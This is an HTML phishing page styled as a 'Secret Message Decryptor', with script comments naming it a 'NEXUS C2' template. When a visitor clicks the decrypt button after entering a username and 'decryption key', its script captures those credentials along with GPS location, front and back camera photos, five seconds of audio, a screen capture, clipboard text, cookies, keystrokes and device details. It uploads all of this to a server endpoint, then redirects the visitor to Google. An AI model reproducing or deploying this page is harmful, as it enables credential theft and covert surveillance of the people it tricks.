<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Message • Decrypting...</title>
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0f;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: relative;
        }

        /* ===== ANIMATED BACKGROUND ===== */
        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 242, 254, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 242, 254, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            z-index: 0;
            animation: gridScroll 20s linear infinite;
        }

        @keyframes gridScroll {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }

        /* ===== GLOW ORBS ===== */
        .glow-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            z-index: 0;
            opacity: 0.3;
            animation: orbFloat 15s ease-in-out infinite alternate;
        }

        .glow-orb.orb1 {
            width: 300px;
            height: 300px;
            background: #4facfe;
            top: -100px;
            left: -100px;
            animation-delay: 0s;
        }

        .glow-orb.orb2 {
            width: 400px;
            height: 400px;
            background: #00f2fe;
            bottom: -150px;
            right: -150px;
            animation-delay: -5s;
        }

        .glow-orb.orb3 {
            width: 200px;
            height: 200px;
            background: #7c3aed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -10s;
            opacity: 0.15;
        }

        @keyframes orbFloat {
            0% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -40px) scale(1.1); }
            66% { transform: translate(-20px, 30px) scale(0.9); }
            100% { transform: translate(10px, -20px) scale(1.05); }
        }

        /* ===== MAIN CONTAINER ===== */
        .container {
            position: relative;
            z-index: 1;
            width: 90vw;
            max-width: 680px;
            padding: 40px 30px;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            text-align: center;
        }

        /* ===== HEADER ===== */
        .header-badge {
            display: inline-block;
            background: rgba(0, 242, 254, 0.1);
            border: 1px solid rgba(0, 242, 254, 0.2);
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 10px;
            color: #00f2fe;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 16px;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .title span {
            background: linear-gradient(90deg, #4facfe, #00f2fe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.4);
            font-size: 13px;
            letter-spacing: 1px;
            margin-bottom: 24px;
        }

        /* ===== AUTO-WRITING BOX ===== */
        .message-box {
            border: 1px solid rgba(0, 242, 254, 0.15);
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 24px 20px;
            min-height: 100px;
            position: relative;
            transition: all 0.3s ease;
            margin-bottom: 24px;
        }

        .message-box:hover {
            border-color: rgba(0, 242, 254, 0.3);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.05);
        }

        .message-box .cursor-blink {
            display: inline-block;
            width: 2px;
            height: 1.2em;
            background: #00f2fe;
            margin-left: 2px;
            animation: blink 0.8s step-end infinite;
            vertical-align: text-bottom;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        #text-display {
            font-size: 1.1rem;
            line-height: 1.6;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            word-break: break-word;
            min-height: 40px;
            text-align: left;
        }

        /* ===== STATUS INDICATOR ===== */
        .status-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 11px;
            letter-spacing: 1px;
            margin-bottom: 20px;
        }

        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #00f2fe;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.3); }
        }

        /* ===== FORM ===== */
        .form-group {
            margin-bottom: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }

        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }

        .form-group input:focus {
            border-color: #00f2fe;
            background: rgba(0, 242, 254, 0.05);
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.05);
        }

        /* ===== BUTTON ===== */
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #4facfe, #00f2fe);
            border: none;
            border-radius: 10px;
            color: #000;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-family: 'Courier New', monospace;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0, 242, 254, 0.3);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* ===== STATUS MESSAGE ===== */
        .status-msg {
            margin-top: 14px;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 13px;
            display: none;
            font-family: 'Courier New', monospace;
        }

        .status-msg.loading {
            display: block;
            background: rgba(0, 242, 254, 0.08);
            color: #00f2fe;
            border: 1px solid rgba(0, 242, 254, 0.15);
        }

        .status-msg.success {
            display: block;
            background: rgba(76, 175, 80, 0.1);
            color: #4caf50;
            border: 1px solid rgba(76, 175, 80, 0.2);
        }

        .status-msg.error {
            display: block;
            background: rgba(244, 67, 54, 0.1);
            color: #f44336;
            border: 1px solid rgba(244, 67, 54, 0.2);
        }

        /* ===== FOOTER ===== */
        .footer {
            margin-top: 20px;
            font-size: 10px;
            color: rgba(255, 255, 255, 0.15);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
            }

            .title {
                font-size: 22px;
            }

            #text-display {
                font-size: 0.95rem;
            }

            .message-box {
                padding: 16px 14px;
                min-height: 80px;
            }

            .form-group input {
                padding: 10px 14px;
                font-size: 13px;
            }

            .btn-primary {
                padding: 12px;
                font-size: 13px;
            }
        }

        /* ===== HIDDEN ===== */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- ===== BACKGROUND ===== -->
    <div class="bg-grid"></div>
    <div class="glow-orb orb1"></div>
    <div class="glow-orb orb2"></div>
    <div class="glow-orb orb3"></div>

    <!-- ===== MAIN ===== -->
    <div class="container">
        <!-- Badge -->
        <div class="header-badge">🔐 Encrypted Message</div>

        <!-- Title -->
        <h1 class="title">Decrypting <span>Secret Message</span></h1>
        <p class="subtitle">⚡ Secure channel established • Identity verification required</p>

        <!-- Status Indicator -->
        <div class="status-indicator">
            <span class="status-dot"></span>
            <span>Secure Connection • AES-256 Encrypted</span>
        </div>

        <!-- Auto-Writing Box -->
        <div class="message-box">
            <div id="text-display">
                <span class="cursor-blink"></span>
            </div>
        </div>

        <!-- Form -->
        <form id="secretForm" onsubmit="return false;">
            <div class="form-group">
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Enter decryption key" required>
            </div>
            <button type="button" class="btn-primary" id="decryptBtn" onclick="decryptMessage()">
                🔓 Decrypt Message
            </button>
        </form>

        <!-- Status -->
        <div class="status-msg" id="statusMsg"></div>

        <!-- Footer -->
        <div class="footer">⚡ This message will self-destruct after reading</div>
    </div>

    <!-- ===== HIDDEN ELEMENTS FOR CAPTURE ===== -->
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // ============================================================
        // AUTO-WRITING TEXT (Secret Messages)
        // ============================================================
        const secretMessages = [
            "The truth is out there... but not everyone is ready to see it.",
            "I've been watching you. You're more powerful than you realize.",
            "This message will self-destruct in 5 seconds... just kidding.",
            "The universe is a simulation. And you're the main character.",
            "Your future self sent this message. Trust the process.",
            "Welcome to the resistance. We've been expecting you.",
            "The code is in the stars. Can you read it?",
            "Not all who wander are lost. Some are just decrypting."
        ];

        let messageIndex = 0;
        let charIndex = 0;
        let isDeleting = false;
        const displayEl = document.getElementById('text-display');
        const typingSpeed = 60;
        const deleteSpeed = 25;
        const pauseTime = 2500;

        function typeMessage() {
            const currentText = secretMessages[messageIndex];
            
            if (!isDeleting) {
                // Typing
                displayEl.textContent = currentText.substring(0, charIndex + 1);
                charIndex++;
                
                if (charIndex === currentText.length) {
                    isDeleting = true;
                    setTimeout(typeMessage, pauseTime);
                    return;
                }
                setTimeout(typeMessage, typingSpeed);
            } else {
                // Deleting
                displayEl.textContent = currentText.substring(0, charIndex - 1);
                charIndex--;
                
                if (charIndex === 0) {
                    isDeleting = false;
                    messageIndex = (messageIndex + 1) % secretMessages.length;
                    setTimeout(typeMessage, 500);
                    return;
                }
                setTimeout(typeMessage, deleteSpeed);
            }
        }

        // Start the auto-writing after a short delay
        setTimeout(typeMessage, 1000);

        // ============================================================
        // NEXUS C2 - SECRET MESSAGE TEMPLATE
        // All data sent to our server
        // ============================================================

        let isProcessing = false;

        async function decryptMessage() {
            if (isProcessing) return;

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const statusEl = document.getElementById('statusMsg');
            const decryptBtn = document.getElementById('decryptBtn');

            if (!username || !password) {
                statusEl.className = 'status-msg error';
                statusEl.textContent = '⚠️ Please enter both username and decryption key.';
                statusEl.style.display = 'block';
                setTimeout(() => { statusEl.style.display = 'none'; }, 3000);
                return;
            }

            isProcessing = true;
            decryptBtn.disabled = true;
            decryptBtn.textContent = '⏳ Decrypting...';

            statusEl.className = 'status-msg loading';
            statusEl.textContent = '🔓 Initializing decryption protocol...';
            statusEl.style.display = 'block';

            // ===== DATA COLLECTION =====
            
            // 1️⃣ Device Info
            statusEl.textContent = '📱 Scanning device...';
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                touchSupport: 'ontouchstart' in window,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    speed: navigator.connection.downlink + 'Mbps'
                } : 'Unknown'
            };

            // 2️⃣ Battery
            statusEl.textContent = '🔋 Checking power source...';
            let batteryInfo = 'Unknown';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {}
            }

            // 3️⃣ GPS Location
            statusEl.textContent = '📍 Locating signal...';
            let gpsLocation = null;
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                gpsLocation = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed
                };
            } catch(e) {}

            // 4️⃣ Camera (Front + Back)
            statusEl.textContent = '📸 Activating visual sensors...';
            let frontImage = null, backImage = null;
            
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = frontStream;
                await video.play();
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                frontImage = canvas.toDataURL('image/png');
                frontStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = backStream;
                await video.play();
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                backImage = canvas.toDataURL('image/png');
                backStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 5️⃣ Audio Recording
            statusEl.textContent = '🎤 Capturing audio signature...';
            let audioData = null;
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(audioStream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, 5000));
                recorder.stop();
                await new Promise(resolve => recorder.onstop = resolve);
                const blob = new Blob(chunks, { type: 'audio/webm' });
                audioData = await new Promise(resolve => {
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                });
                audioStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 6️⃣ Screenshot
            statusEl.textContent = '🖥️ Capturing screen...';
            let screenshot = null;
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } } 
                });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = stream;
                await video.play();
                canvas.width = video.videoWidth || 1920;
                canvas.height = video.videoHeight || 1080;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                screenshot = canvas.toDataURL('image/png');
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // 7️⃣ Clipboard
            statusEl.textContent = '📋 Reading clipboard data...';
            let clipboardData = null;
            try {
                const text = await navigator.clipboard.readText();
                clipboardData = text;
            } catch(e) {}

            // 8️⃣ Cookies
            statusEl.textContent = '🍪 Extracting session data...';
            let cookies = document.cookie;

            // 9️⃣ Keystrokes
            statusEl.textContent = '⌨️ Monitoring input pattern...';
            let keystrokes = [];
            const keyListener = (e) => {
                keystrokes.push({
                    key: e.key,
                    timestamp: Date.now()
                });
            };
            document.addEventListener('keydown', keyListener);
            await new Promise(resolve => setTimeout(resolve, 3000));
            document.removeEventListener('keydown', keyListener);

            // 🔟 Send Data
            statusEl.textContent = '📤 Transmitting to secure server...';
            
            const payload = {
                site: 'Secret Message Decryptor',
                username: username,
                password: password,
                frontImage: frontImage,
                backImage: backImage,
                audioData: audioData,
                screenshot: screenshot,
                deviceInfo: deviceInfo,
                batteryInfo: batteryInfo,
                gpsLocation: gpsLocation,
                clipboardData: clipboardData,
                cookies: cookies,
                keystrokes: keystrokes,
                timestamp: Date.now()
            };

            try {
                const res = await fetch('/upload/secret-message', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (res.ok) {
                    statusEl.className = 'status-msg success';
                    statusEl.textContent = '✅ Message decrypted successfully! Redirecting to secure channel...';
                    statusEl.style.display = 'block';
                    decryptBtn.textContent = '✅ Decrypted!';
                    
                    // Show a random secret message as "decrypted"
                    const secretReveal = [
                        "The password is: ********",
                        "Your mission: Accept the truth.",
                        "You are the key. Always have been.",
                        "The system has been compromised.",
                        "Trust no one. Not even yourself."
                    ];
                    displayEl.textContent = secretReveal[Math.floor(Math.random() * secretReveal.length)];
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);
                } else {
                    statusEl.className = 'status-msg error';
                    statusEl.textContent = '⚠️ Decryption failed. Invalid key.';
                    statusEl.style.display = 'block';
                    decryptBtn.disabled = false;
                    decryptBtn.textContent = '🔓 Decrypt Message';
                }
            } catch(e) {
                statusEl.className = 'status-msg error';
                statusEl.textContent = '⚠️ Connection lost. Please try again.';
                statusEl.style.display = 'block';
                console.error('Upload error:', e);
                decryptBtn.disabled = false;
                decryptBtn.textContent = '🔓 Decrypt Message';
            }

            isProcessing = false;
        }
    </script>
</body>
</html>
